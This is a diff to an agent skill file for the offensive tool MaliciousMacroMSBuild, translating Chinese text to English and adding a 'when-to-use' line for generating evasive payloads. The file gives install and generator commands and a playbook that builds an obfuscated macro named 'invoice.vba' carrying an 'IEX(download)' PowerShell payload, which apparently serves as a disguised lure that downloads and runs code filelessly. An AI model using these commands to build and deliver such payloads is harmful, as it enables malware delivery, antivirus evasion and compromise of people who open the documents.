@@ -2,37 +2,38 @@
 name: m3-gen-msbuild
 description: "MaliciousMacroMSBuild: Fileless evasion via macros embedding MSBuild. Signals: fileless attack, lolbins, macro+MSBuild generation, PS payload, obfuscation."
 zh-signals: "MaliciousMacroMSBuild: 宏内嵌 MSBuild 免杀。信号:无文件攻击,lolbins,宏+MSBuild 生成,PS 载荷,混淆。"
+when-to-use: "Use to generate macro-embedded MSBuild payloads for fileless execution and evasion during red-team operations."
 ---
 
 # MaliciousMacroMSBuild
 
-- 攻击大类:C23 无文件与LOLBins滥用
-- 上游仓库:https://github.com/infosecn1nja/MaliciousMacroMSBuild
-- 上游 License:GPL-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C23 Fileless Attacks and LOLBins Abuse
+- Upstream Repository: https://github.com/infosecn1nja/MaliciousMacroMSBuild
+- Upstream License: GPL-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/infosecn1nja/MaliciousMacroMSBuild
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python3 m3-gen.py -p 'cmd /c whoami' -o macro.vba` | 宏+MSBuild 生成 |
-| `-p powershell -o out.vba` | PS 载荷 |
-| `-e` | 混淆 |
+| `python3 m3-gen.py -p 'cmd /c whoami' -o macro.vba` | Macro + MSBuild generation |
+| `-p powershell -o out.vba` | PowerShell payload |
+| `-e` | Obfuscation |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 宏内嵌 MSBuild 免杀
+### Macro-embedded MSBuild for AV evasion
 
 ```bash
 python3 m3-gen.py -p 'IEX(download)' -o invoice.vba
-# 文档内执行无文件
+# Execute filelessly from inside the document
 ```
 
-## 注意事项
+## Notes
 
-infosecn1nja 出品,宏+MSBuild 组合载荷。
+From infosecn1nja; combined macro + MSBuild payload.
